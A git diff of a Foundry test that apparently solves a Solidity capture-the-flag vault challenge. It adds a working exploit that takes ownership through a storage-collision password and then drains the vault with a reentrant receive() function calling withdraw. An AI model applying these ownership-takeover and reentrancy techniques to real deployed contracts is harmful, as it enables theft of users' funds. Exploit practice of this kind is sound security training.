@@ -15,7 +15,7 @@ contract VaultExploiter is Test {
     address palyer = address (2);
 
     function setUp() public {
-        vm.deal(owner, 1 ether);
+        vm.deal(owner, 2 ether);
 
         vm.startPrank(owner);
         logic = new VaultLogic(bytes32("0x1234"));
@@ -27,13 +27,29 @@ contract VaultExploiter is Test {
     }
 
     function testExploit() public {
-        vm.deal(palyer, 1 ether);
-        vm.startPrank(palyer);
+        vm.deal(palyer, 0.1 ether);
+        vm.startPrank(address(this));
 
         // add your hacker code.
+        //change owner
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
+        (bool ok,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", password, address(this)));
+        require( ok, "changeOwner failed");
+        console.log('owner:', vault.owner());
+    
+        //withdraw
+        vault.deposite{value: 0.1 ether}();
+        vault.openWithdraw();
+        vault.withdraw();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
 
+    receive() external payable {
+        console.log('receive/fallback');
+        if (address(vault).balance > 0) {
+            vault.withdraw();
+        }
+    }
 }
